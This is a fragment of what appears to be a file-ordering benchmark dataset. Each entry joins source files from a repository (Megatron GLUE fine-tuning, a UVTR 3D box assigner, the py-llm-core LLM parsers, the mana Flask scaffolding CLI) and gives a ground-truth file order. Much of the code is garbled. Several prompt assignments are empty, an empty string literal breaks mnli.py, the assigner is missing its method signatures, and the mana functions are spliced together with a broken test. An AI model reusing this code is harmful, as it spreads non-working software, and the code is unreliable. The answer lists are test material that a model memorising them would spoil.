        "content": "'JittorLLMs/models/pangualpha/megatron/__init__.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport torch\n\nfrom .package_info import (\n    __description__,\n    __contact_names__,\n    __url__,\n    __download_url__,\n    __keywords__,\n    __license__,\n    __package_name__,\n    __version__,\n)\n\nfrom .global_vars import get_args\nfrom .global_vars import get_tokenizer\nfrom .global_vars import get_tensorboard_writer\nfrom .global_vars import get_adlr_autoresume\nfrom .global_vars import get_timers\nfrom .initialize  import initialize_megatron\nfrom .tokenizer import tokenizer\n\ndef print_rank_0(message):\n\n    if torch.distributed.is_initialized():\n        if torch.distributed.get_rank() == 0:\n            print(message, flush=True)\n    else:\n        print(message, flush=True)\n\n'JittorLLMs/models/pangualpha/tasks/glue/data.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom abc import ABC\nfrom abc import abstractmethod\n\nfrom torch.utils.data import Dataset\n\nfrom megatron import print_rank_0\nfrom tasks.data_utils import build_sample\nfrom tasks.data_utils import build_tokens_types_paddings_from_text\n\n\nclass GLUEAbstractDataset(ABC, Dataset):\n\n\n    def __init__(self, task_name, dataset_name, datapaths,\n                 tokenizer, max_seq_length):\n\n        self.task_name = task_name\n        self.dataset_name = dataset_name\n        self.tokenizer = tokenizer\n        self.max_seq_length = max_seq_length\n        print_rank_0(' > building {} dataset for {}:'.format(self.task_name,\n                                                             self.dataset_name))\n\n        string = '  > paths:'\n        for path in datapaths:\n            string += ' ' + path\n        print_rank_0(string)\n        self.samples = []\n        for datapath in datapaths:\n            self.samples.extend(self.process_samples_from_single_path(datapath))\n        print_rank_0('  >> total number of samples: {}'.format(\n            len(self.samples)))\n\n    def __len__(self):\n        return len(self.samples)\n\n    def __getitem__(self, idx):\n        raw_sample = self.samples[idx]\n        ids, types, paddings = build_tokens_types_paddings_from_text(\n            raw_sample['text_a'], raw_sample['text_b'],\n            self.tokenizer, self.max_seq_length)\n        sample = build_sample(ids, types, paddings,\n                              raw_sample['label'], raw_sample['uid'])\n        return sample\n\n    @abstractmethod\n    def process_samples_from_single_path(self, datapath):\n\n        pass\n\n'JittorLLMs/models/pangualpha/tasks/glue/finetune.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom megatron import get_args\nfrom megatron import print_rank_0\nfrom megatron import get_tokenizer\nfrom megatron.model.classification import Classification\nfrom tasks.eval_utils import accuracy_func_provider\nfrom tasks.finetune_utils import finetune\n\n\ndef glue_classification(num_classes, Dataset,\n                        name_from_datapath_func):\n\n    def train_valid_datasets_provider():\n\n        args = get_args()\n        tokenizer = get_tokenizer()\n\n        train_dataset = Dataset('training', args.train_data,\n                                tokenizer, args.seq_length)\n        valid_dataset = Dataset('validation', args.valid_data,\n                                tokenizer, args.seq_length)\n\n        return train_dataset, valid_dataset\n\n    def model_provider():\n\n        args = get_args()\n\n        print_rank_0('building classification model for {} ...'.format(\n            args.task))\n\n        return Classification(num_classes=num_classes, num_tokentypes=2)\n\n    def metrics_func_provider():\n\n        def single_dataset_provider(datapath):\n            args = get_args()\n            tokenizer = get_tokenizer()\n\n            name = name_from_datapath_func(datapath)\n            return Dataset(name, [datapath], tokenizer, args.seq_length)\n        return accuracy_func_provider(single_dataset_provider)\n\n\n    finetune(train_valid_datasets_provider, model_provider,\n             end_of_epoch_callback_provider=metrics_func_provider)\n\n\ndef main():\n    args = get_args()\n\n    if args.task == 'MNLI':\n\n        num_classes = 3\n        from tasks.glue.mnli import MNLIDataset as Dataset\n\n        def name_from_datapath(datapath):\n            return datapath.split('MNLI')[-1].strip(\n                '.tsv').strip('/').replace('_', '-')\n\n    elif args.task == 'QQP':\n\n        num_classes = 2\n        from tasks.glue.qqp import QQPDataset as Dataset\n\n        def name_from_datapath(datapath):\n            return datapath.split('QQP')[-1].strip(\n                '.tsv').strip('/').replace('_', '-')\n\n    else:\n        raise NotImplementedError('GLUE task {} is not implemented.'.format(\n            args.task))\n\n    glue_classification(num_classes, Dataset, name_from_datapath)\n\n'JittorLLMs/models/pangualpha/megatron/package_info.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nMAJOR = 1\nMINOR = 1.2\n\n\nVERSION = (MAJOR, MINOR)\n\n__version__ = '.'.join(map(str, VERSION))\n__package_name__ = 'megatron-lm'\n__contact_names__ = 'NVIDIA INC'\n__url__ = 'https://github.com/NVIDIA/Megatron-LM'\n__download_url__ = 'https://github.com/NVIDIA/Megatron-LM/releases'\n__description__ = 'Megatron-LM: Training Multi-Billion Parameter Language Models Using Model Parallelism.'\n__license__ = 'See https://github.com/NVIDIA/Megatron-LM/blob/master/LICENSE'\n__keywords__ = 'deep learning, Megatron, gpu, NLP, nvidia, pytorch, torch, language'\n\n\n'JittorLLMs/models/pangualpha/tasks/glue/mnli.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom megatron import print_rank_0\nfrom tasks.data_utils import clean_text\nfrom .data import GLUEAbstractDataset\n\n\nLABELS = {'contradiction': 0, 'entailment': 1, 'neutral': 2}\n\n\nclass MNLIDataset(GLUEAbstractDataset):\n\n    def __init__(self, name, datapaths, tokenizer, max_seq_length,\n                 test_label='contradiction'):\n        self.test_label = test_label\n        super().__init__('MNLI', name, datapaths,\n                         tokenizer, max_seq_length)\n\n    def process_samples_from_single_path(self, filename):\n        \"\n        print_rank_0(' > Processing {} ...'.format(filename))\n\n        samples = []\n        total = 0\n        first = True\n        is_test = False\n        with open(filename, 'r') as f:\n            for line in f:\n                row = line.strip().split('\\t')\n                if first:\n                    first = False\n                    if len(row) == 10:\n                        is_test = True\n                        print_rank_0(\n                            '   reading {}, {} and {} columns and setting '\n                            'labels to {}'.format(\n                                row[0].strip(), row[8].strip(),\n                                row[9].strip(), self.test_label))\n                    else:\n                        print_rank_0('    reading {} , {}, {}, and {} columns '\n                                     '...'.format(\n                                         row[0].strip(), row[8].strip(),\n                                         row[9].strip(), row[-1].strip()))\n                    continue\n\n                text_a = clean_text(row[8].strip())\n                text_b = clean_text(row[9].strip())\n                unique_id = int(row[0].strip())\n                label = row[-1].strip()\n                if is_test:\n                    label = self.test_label\n\n                assert len(text_a) > 0\n                assert len(text_b) > 0\n                assert label in LABELS\n                assert unique_id >= 0\n\n                sample = {'text_a': text_a,\n                          'text_b': text_b,\n                          'label': LABELS[label],\n                          'uid': unique_id}\n                total += 1\n                samples.append(sample)\n\n                if total % 50000 == 0:\n                    print_rank_0('  > processed {} so far ...'.format(total))\n\n        print_rank_0(' >> processed {} samples.'.format(len(samples)))\n        return samples\n",
        "gt": [
            "'JittorLLMs/models/pangualpha/megatron/package_info.py'",
            "'JittorLLMs/models/pangualpha/megatron/__init__.py'",
            "'JittorLLMs/models/pangualpha/tasks/glue/data.py'",
            "'JittorLLMs/models/pangualpha/tasks/glue/mnli.py'",
            "'JittorLLMs/models/pangualpha/tasks/glue/finetune.py'"
        ]
    },
    {
        "files": [
            "'UVTR/projects/mmdet3d_plugin/core/bbox/assigners/hungarian_assigner_3d.py'",
            "'UVTR/projects/mmdet3d_plugin/core/bbox/util.py'",
            "'UVTR/projects/mmdet3d_plugin/core/bbox/assigners/__init__.py'"
        ],
        "content": "'UVTR/projects/mmdet3d_plugin/core/bbox/assigners/hungarian_assigner_3d.py'\n:import torch\n\nfrom mmdet.core.bbox.builder import BBOX_ASSIGNERS\nfrom mmdet.core.bbox.assigners import AssignResult\nfrom mmdet.core.bbox.assigners import BaseAssigner\nfrom mmdet.core.bbox.match_costs import build_match_cost\nfrom mmdet.models.utils.transformer import inverse_sigmoid\nfrom projects.mmdet3d_plugin.core.bbox.util import normalize_bbox\n\ntry:\n    from scipy.optimize import linear_sum_assignment\nexcept ImportError:\n    linear_sum_assignment = None\n\n\n@BBOX_ASSIGNERS.register_module()\nclass HungarianAssigner3D(BaseAssigner):\n    \"\"\"Computes one-to-one matching between predictions and ground truth.\n    This class computes an assignment between the targets and the predictions\n    based on the costs. The costs are weighted sum of three components:\n    classification cost, regression L1 cost and regression iou cost. The\n    targets don't include the no_object, so generally there are more\n    predictions than targets. After the one-to-one matching, the un-matched\n    are treated as backgrounds. Thus each query prediction will be assigned\n    with `0` or a positive integer indicating the ground truth index:\n    - 0: negative sample, no assigned gt\n    - positive integer: positive sample, index (1-based) of assigned gt\n    Args:\n        cls_weight (int | float, optional): The scale factor for classification\n            cost. Default 1.0.\n        bbox_weight (int | float, optional): The scale factor for regression\n            L1 cost. Default 1.0.\n        iou_weight (int | float, optional): The scale factor for regression\n            iou cost. Default 1.0.\n        iou_calculator (dict | optional): The config for the iou calculation.\n            Default type `BboxOverlaps2D`.\n        iou_mode (str | optional): \"iou\" (intersection over union), \"iof\"\n                (intersection over foreground), or \"giou\" (generalized\n                intersection over union). Default \"giou\".\n    Computes one-to-one matching based on the weighted costs.\n        This method assign each query prediction to a ground truth or\n        background. The `assigned_gt_inds` with -1 means don't care,\n        0 means negative sample, and positive number is the index (1-based)\n        of assigned gt.\n        The assignment is done in the following steps, the order matters.\n        1. assign every prediction to -1\n        2. compute the weighted costs\n        3. do Hungarian matching on CPU based on the costs\n        4. assign all to 0 (background) first, then for each matched pair\n           between predictions and gts, treat this prediction as foreground\n           and assign the corresponding gt index (plus 1) to it.\n        Args:\n            bbox_pred (Tensor): Predicted boxes with normalized coordinates\n                (cx, cy, w, h), which are all in range [0, 1]. Shape\n                [num_query, 4].\n            cls_pred (Tensor): Predicted classification logits, shape\n                [num_query, num_class].\n            gt_bboxes (Tensor): Ground truth boxes with unnormalized\n                coordinates (x1, y1, x2, y2). Shape [num_gt, 4].\n            gt_labels (Tensor): Label of `gt_bboxes`, shape (num_gt,).\n            gt_bboxes_ignore (Tensor, optional): Ground truth bboxes that are\n                labelled as `ignored`. Default None.\n            eps (int | float, optional): A value added to the denominator for\n                numerical stability. Default 1e-7.\n        Returns:\n            :obj:`AssignResult`: The assigned result.\n        \"\"\"\n        assert gt_bboxes_ignore is None, \\\n            'Only case when gt_bboxes_ignore is None is supported.'\n        num_gts, num_bboxes = gt_bboxes.size(0), bbox_pred.size(0)\n\n\n        assigned_gt_inds = bbox_pred.new_full((num_bboxes, ),\n                                              -1,\n                                              dtype=torch.long)\n        assigned_labels = bbox_pred.new_full((num_bboxes, ),\n                                             -1,\n                                             dtype=torch.long)\n        if num_gts == 0 or num_bboxes == 0:\n\n            if num_gts == 0:\n\n                assigned_gt_inds[:] = 0\n            return AssignResult(\n                num_gts, assigned_gt_inds, None, labels=assigned_labels)\n\n\n\n        cls_cost = self.cls_cost(cls_pred, gt_labels)\n\n        normalized_gt_bboxes = normalize_bbox(gt_bboxes, self.pc_range)\n        reg_cost = self.reg_cost(bbox_pred[:, :8], normalized_gt_bboxes[:, :8])\n\n\n        cost = cls_cost + reg_cost\n\n\n        cost = cost.detach().cpu()\n        if linear_sum_assignment is None:\n            raise ImportError('Please run \"pip install scipy\" '\n                              'to install scipy first.')\n        matched_row_inds, matched_col_inds = linear_sum_assignment(cost)\n        matched_row_inds = torch.from_numpy(matched_row_inds).to(\n            bbox_pred.device)\n        matched_col_inds = torch.from_numpy(matched_col_inds).to(\n            bbox_pred.device)\n\n\n\n        assigned_gt_inds[:] = 0\n\n        assigned_gt_inds[matched_row_inds] = matched_col_inds + 1\n        assigned_labels[matched_row_inds] = gt_labels[matched_col_inds]\n        return AssignResult(\n            num_gts, assigned_gt_inds, None, labels=assigned_labels)\n'UVTR/projects/mmdet3d_plugin/core/bbox/util.py'\n:import torch\nimport numpy as np\nimport mmdet3d\n\n__mmdet3d_version__ = float(mmdet3d.__version__[:3])\n\n\ndef normalize_bbox(bboxes, pc_range=None):\n\n    cx = bboxes[..., 0:1]\n    cy = bboxes[..., 1:2]\n    cz = bboxes[..., 2:3]\n\n    if __mmdet3d_version__ < 1.0:\n        w = bboxes[..., 3:4].log()\n        l = bboxes[..., 4:5].log()\n        h = bboxes[..., 5:6].log()\n        rot = bboxes[..., 6:7]\n    else:\n        l = bboxes[..., 3:4].log()\n        w = bboxes[..., 4:5].log()\n        h = bboxes[..., 5:6].log()\n        rot = bboxes[..., 6:7]\n        rot = -rot - np.pi / 2\n\n    if bboxes.size(-1) > 7:\n        vx = bboxes[..., 7:8]\n        vy = bboxes[..., 8:9]\n        normalized_bboxes = torch.cat(\n            (cx, cy, w, l, cz, h, rot.sin(), rot.cos(), vx, vy), dim=-1\n        )\n    else:\n        normalized_bboxes = torch.cat(\n            (cx, cy, w, l, cz, h, rot.sin(), rot.cos()), dim=-1\n        )\n    return normalized_bboxes\n\ndef denormalize_bbox(normalized_bboxes, pc_range=None, version=0.8):\n\n    rot_sine = normalized_bboxes[..., 6:7]\n\n    rot_cosine = normalized_bboxes[..., 7:8]\n    rot = torch.atan2(rot_sine, rot_cosine)\n\n\n    if __mmdet3d_version__ >= 1.0:\n        rot = -rot - np.pi / 2\n\n    cx = normalized_bboxes[..., 0:1]\n    cy = normalized_bboxes[..., 1:2]\n    cz = normalized_bboxes[..., 4:5]\n\n\n    w = normalized_bboxes[..., 2:3]\n    l = normalized_bboxes[..., 3:4]\n    h = normalized_bboxes[..., 5:6]\n\n    w = w.exp()\n    l = l.exp()\n    h = h.exp()\n    if normalized_bboxes.size(-1) > 8:\n\n        vx = normalized_bboxes[..., 8:9]\n        vy = normalized_bboxes[..., 9:10]\n        if __mmdet3d_version__ < 1.0:\n            denormalized_bboxes = torch.cat([cx, cy, cz, w, l, h, rot, vx, vy], dim=-1)\n        else:\n            denormalized_bboxes = torch.cat([cx, cy, cz, l, w, h, rot, vx, vy], dim=-1)\n    else:\n        if __mmdet3d_version__ < 1.0:\n            denormalized_bboxes = torch.cat([cx, cy, cz, w, l, h, rot], dim=-1)\n        else:\n            denormalized_bboxes = torch.cat([cx, cy, cz, l, w, h, rot], dim=-1)\n    return denormalized_bboxes\n\ndef bbox3d_mapping_back(bboxes, rot_degree, scale_factor, flip_horizontal, flip_vertical):\n\n    new_bboxes = bboxes.clone()\n    if flip_horizontal:\n        new_bboxes.flip('horizontal')\n    if flip_vertical:\n        new_bboxes.flip('vertical')\n    new_bboxes.scale(1 / scale_factor)\n    new_bboxes.rotate(-rot_degree)\n\n    return new_bboxes\n\n'UVTR/projects/mmdet3d_plugin/core/bbox/assigners/__init__.py'\n:from .hungarian_assigner_3d import HungarianAssigner3D\n\n__all__ = ['HungarianAssigner3D']\n",
        "gt": [
            "'UVTR/projects/mmdet3d_plugin/core/bbox/util.py'",
            "'UVTR/projects/mmdet3d_plugin/core/bbox/assigners/hungarian_assigner_3d.py'",
            "'UVTR/projects/mmdet3d_plugin/core/bbox/assigners/__init__.py'"
        ]
    },
    {
        "files": [
            "'py-llm-core/src/llm_core/parsers.py'",
            "'py-llm-core/src/llm_core/assistants/__init__.py'",
            "'py-llm-core/examples/synthetic-dataset-generation-example.py'",
            "'py-llm-core/src/llm_core/assistants/base.py'"
        ],
        "content": "'py-llm-core/src/llm_core/parsers.py'\n:\nimport dirtyjson\n\nfrom .llm import OpenAIChatModel, LLaMACPPModel, MistralAILarge\nfrom .schema import to_json_schema, from_dict\n\n\nclass BaseParser:\n    def __init__(self, target_cls, *args, **kwargs):\n        self.target_cls = target_cls\n        self.target_json_schema = to_json_schema(self.target_cls)\n\n    def deserialize(self, json_str):\n        attributes = dirtyjson.loads(json_str)\n        return from_dict(self.target_cls, attributes)\n\n    def parse(self, text):\n        prompt = \"Extract and parse information from provided content\"\n        history = [{\"role\": \"user\", \"content\": text}]\n        completion = self.model_wrapper.ask(\n            prompt, history, schema=self.target_json_schema\n        )\n        instance = self.deserialize(completion.choices[0].message.content)\n        return instance\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        pass\n\n\nclass OpenAIParser(BaseParser):\n    def __init__(\n        self,\n        target_cls,\n        model=\"gpt-3.5-turbo\",\n        completion_kwargs=None,\n        *args,\n        **kwargs\n    ):\n        super().__init__(target_cls, *args, **kwargs)\n        self.completion_kwargs = (\n            {} if completion_kwargs is None else completion_kwargs\n        )\n\n        self.model_wrapper = OpenAIChatModel(\n            name=model,\n            system_prompt=(\n                \"Act as a powerful AI able to extract, parse and process \"\n                \"information from unstructured content.\"\n            ),\n        )\n        self.ctx_size = self.model_wrapper.ctx_size\n        self.model_name = self.model_wrapper.name\n\n\nclass LLaMACPPParser(BaseParser):\n\n\n    def __init__(\n        self,\n        target_cls,\n        model=\"mistral\",\n        completion_kwargs=None,\n        llama_cpp_kwargs=None,\n        *args,\n        **kwargs\n    ):\n        super().__init__(target_cls, *args, **kwargs)\n        self.completion_kwargs = (\n            {} if completion_kwargs is None else completion_kwargs\n        )\n\n        self.model_wrapper = LLaMACPPModel(\n            name=model, llama_cpp_kwargs=llama_cpp_kwargs\n        )\n        self.ctx_size = self.model_wrapper.ctx_size\n        self.model_name = self.model_wrapper.name\n\n    def __enter__(self):\n        self.model_wrapper.load_model()\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        self.model_wrapper.release_model()\n\n\nclass MistralAILargeParser(BaseParser):\n    def __init__(\n        self,\n        target_cls,\n        model=\"mistral-large-latest\",\n        completion_kwargs=None,\n        *args,\n        **kwargs\n    ):\n        super().__init__(target_cls, *args, **kwargs)\n        self.completion_kwargs = (\n            {} if completion_kwargs is None else completion_kwargs\n        )\n\n        self.model_wrapper = MistralAILarge(\n            name=model,\n            system_prompt=(\n                \"Act as a powerful AI able to extract, parse and process \"\n                \"information from unstructured content.\"\n            ),\n        )\n        self.ctx_size = self.model_wrapper.ctx_size\n        self.model_name = self.model_wrapper.name\n\n'py-llm-core/src/llm_core/assistants/__init__.py'\n:from .base import OpenAIAssistant, LLaMACPPAssistant, MistralAILargeAssistant\nfrom .summarizers import Summarizer, SimpleSummary, DenserSummaryCollection\nfrom .verifiers import (\n    QuestionCollection,\n    Doubter,\n    AnswerConsistency,\n    ConsistencyVerifier,\n)\nfrom .analysts import Answer, Analyst\n\n\n__all__ = [\n    \"OpenAIAssistant\",\n    \"LLaMACPPAssistant\",\n    \"MistralAILargeAssistant\",\n    \"Summarizer\",\n    \"SimpleSummary\",\n    \"DenserSummaryCollection\",\n    \"QuestionCollection\",\n    \"Doubter\",\n    \"AnswerConsistency\",\n    \"ConsistencyVerifier\",\n    \"Answer\",\n    \"Analyst\",\n]\n\n'py-llm-core/examples/synthetic-dataset-generation-example.py'\n:import json\nfrom typing import List\nfrom enum import Enum\nfrom dataclasses import dataclass, asdict\nfrom llm_core.assistants import LLaMACPPAssistant\n\n\nclass CRUDOperation(Enum):\n    CREATE = 0\n    READ = 1\n    UPDATE = 2\n    DELETE = 3\n\n\n@dataclass\nclass UserQueryGenerator:\n    system_prompt = \"You are a helpful assistant.\"\n    prompt =\n    user_queries: List[str]\n\n    @classmethod\n    def generate(cls, queries_count=10, examples=()):\n        with LLaMACPPAssistant(\n            cls,\n            model=\"mistral\",\n            completion_kwargs={\"temperature\": 0.8},\n        ) as assistant:\n            batch = assistant.process(\n                queries_count=queries_count, examples=examples\n            )\n            return batch.user_queries\n\n\n@dataclass\nclass UserQueryGeneratorV2:\n    system_prompt = \"You are a helpful assistant.\"\n    prompt =\n    user_prompts: List[str]\n\n    @classmethod\n    def generate(cls, queries_count=20, examples=()):\n        with LLaMACPPAssistant(\n            cls,\n            model=\"mistral\",\n            completion_kwargs={\"temperature\": 1.0},\n        ) as assistant:\n            batch = assistant.process(queries_count=queries_count)\n            return batch.user_prompts\n\n\n@dataclass\nclass UserQueryClassification:\n    system_prompt = \"You are a helpful assistant.\"\n    prompt =\n    operation: CRUDOperation\n    item: str\n\n    def to_json(self):\n        attrs = asdict(self)\n        attrs[\"operation\"] = attrs[\"operation\"].name\n        return json.dumps(attrs)\n\n    @classmethod\n    def classify(cls, prompt):\n        with LLaMACPPAssistant(cls, model=\"mistral\") as assistant:\n            user_query = assistant.process(prompt=prompt)\n            return user_query\n\n\ndef main():\n    dataset_queries = []\n\n    with open(\"dataset.txt\", \"a\") as file:\n        for i in range(5):\n            queries = UserQueryGeneratorV2.generate()\n            for query in queries:\n                print(query, file=file, flush=True)\n                dataset_queries.append(query)\n\n    with open(\"dataset.jsonl\", \"a\") as file:\n        for query in dataset_queries:\n            classification = UserQueryClassification.classify(query)\n            print(classification.to_json(), file=file, flush=True)\n\n'py-llm-core/src/llm_core/assistants/base.py'\n:\nfrom ..parsers import (\n    BaseParser,\n    OpenAIParser,\n    LLaMACPPParser,\n    MistralAILargeParser,\n)\n\n\nclass BaseAssistant(BaseParser):\n    def __init__(self, target_cls, *args, **kwargs):\n        super().__init__(target_cls, *args, **kwargs)\n        self.system_prompt = getattr(self.target_cls, \"system_prompt\", \"\")\n        self.prompt = getattr(self.target_cls, \"prompt\", \"\")\n\n    def process(self, **kwargs):\n        system_prompt = self.system_prompt.format(**kwargs)\n        prompt = self.prompt.format(**kwargs)\n\n        self.model_wrapper.system_prompt = system_prompt\n\n        completion = self.model_wrapper.ask(\n            prompt, schema=self.target_json_schema, **self.completion_kwargs\n        )\n        instance = self.deserialize(completion.choices[0].message.content)\n        return instance\n\n\nclass OpenAIAssistant(BaseAssistant, OpenAIParser):\n    def __init__(self, target_cls, model=\"gpt-3.5-turbo\", *args, **kwargs):\n        super().__init__(target_cls, model=model, *args, **kwargs)\n\n\nclass LLaMACPPAssistant(BaseAssistant, LLaMACPPParser):\n    def __init__(\n        self,\n        target_cls,\n        model=\"mistral\",\n        llama_cpp_kwargs=None,\n        *args,\n        **kwargs\n    ):\n        super().__init__(\n            target_cls,\n            model=model,\n            llama_cpp_kwargs=llama_cpp_kwargs,\n            *args,\n            **kwargs\n        )\n\n\nclass MistralAILargeAssistant(BaseAssistant, MistralAILargeParser):\n    def __init__(\n        self, target_cls, model=\"mistral-large-latest\", *args, **kwargs\n    ):\n        super().__init__(target_cls, model=model, *args, **kwargs)\n",
        "gt": [
            "'py-llm-core/src/llm_core/parsers.py'",
            "'py-llm-core/src/llm_core/assistants/base.py'",
            "'py-llm-core/src/llm_core/assistants/__init__.py'",
            "'py-llm-core/examples/synthetic-dataset-generation-example.py'"
        ]
    },
    {
        "files": [
            "'mana/mana/templates/auth/_auth_login_css.py'",
            "'mana/mana/mana.py'",
            "'mana/mana/templates/auth/__init__.py'",
            "'mana/test_mana.py'"
        ],
        "content": "'mana/mana/templates/auth/_auth_login_css.py'\n:\n\n_auth_login_css_code =\n\n'mana/mana/mana.py'\n:\n\n\n\nimport os\n\n\nfrom operators import _mkdir_p\nfrom operators import init_code\n\n\nfrom templates.manage import _manage_basic_code, _manage_admin_code\nfrom templates.requirement import _requirement_code, _requirement_admin_code\nfrom templates.views import _views_basic_code, _views_blueprint_code\nfrom templates.forms import _forms_basic_code\nfrom templates.init import _init_basic_code, _init_blueprint_code, \\\n                           _init_admin_code\nfrom templates.config import _config_sql_code\nfrom templates.models import _models_admin_code\nfrom templates.admin import _admin_views_code, _admin_index_html_code, \\\n                            _admin_logout_html_code\nfrom templates.auth import _auth_forms_code, _auth_views_code, \\\n                           _auth_login_html_code, _auth_login_css_code\n\n\nimport logging\nfrom logging import StreamHandler, DEBUG\n\nlogger = logging.getLogger(__name__)\nlogger.setLevel(DEBUG)\nlogger.addHandler(StreamHandler())\n\n\n\ndef warning_path_exist(path):\n\n    logger.warning('''\\033[31m{Warning}\\033[0m\n    ==> \\033[32m%s\\033[0m\\n exist\n    ==> please change the project name,\n    ==> and try again !\\033[33m{Info}\\033[0m\n    ==> start init your flask project [on]\n    ==> \\033[32m%s\\033[0m\\n\\033[33m{Info}\\033[0m\n    ==> init your flask project done !''')\n\n\n\ndef create_templates_static_files(app_path):\n\n    templates_path = os.path.join(app_path, 'templates')\n    static_path = os.path.join(app_path, 'static')\n    _mkdir_p(templates_path)\n    _mkdir_p(static_path)\n\n    os.chdir(static_path)\n    img_path = os.path.join(static_path, 'img')\n    css_path = os.path.join(static_path, 'css')\n    js_path = os.path.join(static_path, 'js')\n    _mkdir_p(img_path)\n    _mkdir_p(css_path)\n    _mkdir_p(js_path)\n\n    return css_path, templates_path\n\n\ndef create_blueprint(app_path, blueprint, views_code, forms_code, templates_path):\n\n    blueprint_path = os.path.join(app_path, blueprint)\n    _mkdir_p(blueprint_path)\n\n    os.chdir(blueprint_path)\n    init_code('__init__.py', _init_blueprint_code % (blueprint, blueprint))\n    init_code('views.py', views_code)\n    init_code('forms.py', forms_code)\n\n    os.chdir(templates_path)\n    blueprint_templates_path = os.path.join(templates_path, blueprint)\n    _mkdir_p(blueprint_templates_path)\n\n    return blueprint_templates_path\n\n\n\nimport click\n\n\n@click.group()\ndef cli():\n    \"\"\"\n    the missing startproject command for Flask\n\n    \\b\n    [processes]\n    virtualenv venv\n    && source venv/bin/activate     -> create a virtual environment (optional)\n    pip install -r requirement.txt  -> install flask extensions\n\n    \\b\n    python manage.py db init\n    python manage.py db migrate\n    python manage.py db upgrade     -> setup sql database(default database is sqlite)\n\n    \\b\n    python manage.py shell          -> create roles\n    >> Role.insert_roles()\n    >> quit()\n\n    \\b\n    python manage.py admin          -> create admin user\n    python manage.py runserver(-d)  -> run project(in debug mode)'''\n\n    build a minimal flask project\n\n    create and register a blueprint\n    \"\"\"\n    app = os.getcwd().split('/')[-1]\n    if app != 'app':\n        logger.warning('''\\033[31m{Warning}\\033[0m\n==> your current path is \\033[32m%s\\033[0m\\n\n==> please create your blueprint under app folder!\\033[31m{Warning}\\033[0m\n==> bluprint \\033[32m%s\\033[0m\\n exist\n==> please try again !''' % dst_path)\n        exit(1)\n\n\n    _mkdir_p(dst_path)\n\n\n    os.chdir(dst_path)\n\n    init_code('__init__.py', _init_blueprint_code %\n        (blueprint_name, blueprint_name))\n    init_code('views.py', _views_blueprint_code %\n        (blueprint_name, blueprint_name))\n    init_code('forms.py', _forms_basic_code)\n\n\n    os.chdir(os.path.join(dst_path, '..'))\n    with open('__init__.py', 'r+') as f:\n        prev = pos = 0\n        while f.readline():\n            prev, pos = pos, f.tell()\n        f.seek(prev)\n        f.write(\n            '\\nfrom %s import %s\\napp.register_blueprint(%s, url_prefix=\"/%s\")\\n\\n'\n            % (\n                blueprint_name, blueprint_name,\n                blueprint_name, blueprint_name\n            )\n        )\n\n\n    templates_path = os.path.join(os.getcwd(), 'templates')\n    os.chdir(templates_path)\n    blueprint_templates_path = os.path.join(templates_path, blueprint_name)\n    _mkdir_p(blueprint_templates_path)\n\n    logger.info('''\\033[33m{Info}\\033[0m: create blueprint done!''')\n\n\n@click.command()\n@click.argument('project_name')\ndef startproject(project_name):\n\n\n    dst_path = os.path.join(os.getcwd(), project_name)\n    start_init_info(dst_path)\n\n\n    _mkdir_p(dst_path)\n\n\n    os.chdir(dst_path)\n\n    init_code('manage.py', _manage_admin_code)\n    init_code('requirement.txt', _requirement_admin_code)\n    init_code('config.py', _config_sql_code)\n\n\n    app_path = os.path.join(dst_path, 'app')\n    _mkdir_p(app_path)\n\n\n    os.chdir(app_path)\n    init_code('models.py', _models_admin_code)\n    init_code('__init__.py', _init_admin_code)\n\n\n    css_path, templates_path = create_templates_static_files(app_path)\n\n    os.chdir(css_path)\n    init_code('sign.css', _auth_login_css_code)\n\n\n    create_blueprint(\n        app_path,\n        'main',\n        _views_blueprint_code % ('main', 'main'),\n        _forms_basic_code,\n        templates_path\n    )\n\n\n    auth_templates_path = create_blueprint(\n        app_path,\n        'auth',\n        _auth_views_code,\n        _auth_forms_code,\n        templates_path\n    )\n\n    os.chdir(auth_templates_path)\n    init_code('login.html', _auth_login_html_code)\n\n\n    admin_path = os.path.join(app_path, 'admin')\n    _mkdir_p(admin_path)\n\n\n    os.chdir(admin_path)\n    init_code('__init__.py', '')\n    init_code('views.py', _admin_views_code)\n\n\n    os.chdir(templates_path)\n    admin_templates_path = os.path.join(templates_path, 'admin')\n    _mkdir_p(admin_templates_path)\n\n\n    os.chdir(admin_templates_path)\n    init_code('index.html', _admin_index_html_code)\n    init_code('logout.html', _admin_logout_html_code)\n\n    init_done_info()\n\n\n@click.command()\n@click.argument('module')\ndef admin(module):\n\n\n    app = os.getcwd().split('/')[-1]\n    if app != 'app':\n        logger.warning('''\\033[31m{Warning}\\033[0m\n==> your current path is \\033[32m%s\\033[0m\\n\n==> please add your sql module under app folder!''' % os.getcwd())\n        exit(1)\n\n    admin_path = os.path.join(os.getcwd(), 'admin')\n    os.chdir(admin_path)\n    with open('views.py', 'r+') as f:\n        prev = pos = 0\n        while f.readline():\n            prev, pos = pos, f.tell()\n        f.seek(prev)\n        f.write(\n            '\\nfrom app.models import %s\\nadmin.add_view(ModelView(%s, db.session))'\n            % (module, module)\n        )\n\n    logger.info('''\\033[33m{Info}\\033[0m: add module done!''')\n\n\n@click.command()\ndef version():\n\n    click.echo(\"mana version: 4.9 \\/ \")\n\n\n\ncli.add_command(init)\ncli.add_command(blueprint)\ncli.add_command(startproject)\ncli.add_command(admin)\ncli.add_command(version)\n\n'mana/mana/templates/auth/__init__.py'\n:\n\nfrom _auth_forms import _auth_forms_code\nfrom _auth_views import _auth_views_code\nfrom _auth_login_html import _auth_login_html_code\nfrom _auth_login_css import _auth_login_css_code\n\n'mana/test_mana.py'\n:\n\n\n\nimport unittest\n\nfrom mana.mana import create_templates_static_files, create_blueprint\n\nfrom mana.mana import init, startproject, admin, version, blueprint\nfrom setup import version\n\n\nclass ManaTestCase(unittest.TestCase):\n\n\n    def test_command_init(self):\n\n        pass\n\n    def test_command_startproject(self):\n        pass\n\n    def test_command_admin(self):\n        pass\n\n    def test_command_version(self):\n\n        test_mana_version = \"mana version: %s \\/\" % version\n        mana_version = eval(\"mana version\")\n        self.assertTrue(mana_version=test_mana_version)\n\n    def test_command_blueprint(self):\n        pass\n\nif __name__ == \"__main__\":\n    